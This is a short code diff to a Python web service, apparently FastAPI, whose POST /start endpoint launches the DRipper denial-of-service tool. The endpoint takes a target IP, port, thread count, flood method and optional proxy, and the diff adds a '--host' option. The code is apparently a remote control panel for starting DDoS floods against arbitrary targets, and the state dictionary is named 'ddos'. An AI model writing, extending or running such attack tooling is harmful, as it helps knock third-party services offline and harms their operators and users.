@@ -13,10 +13,11 @@ ddos = {}
 
 @app.post("/start")
 def start(
-        ip: str, port: int = 80, threads: int = 100, method: str = 'udp', resource: str = '', proxy: str = '',
+        ip: str, port: int = 80, threads: int = 100, method: str = 'udp',
+        resource: str = '', host: str = '', proxy: str = '',
 ):
     command_chain = ['python3', 'DRipper.py', '-s', ip, '-p', str(port), '-t', str(threads), '-m', method,
-                     '--resource', resource]
+                     '--resource', resource, '--host', host]
     if proxy != '':
         command_chain = [proxy] + command_chain
     print(command_chain)
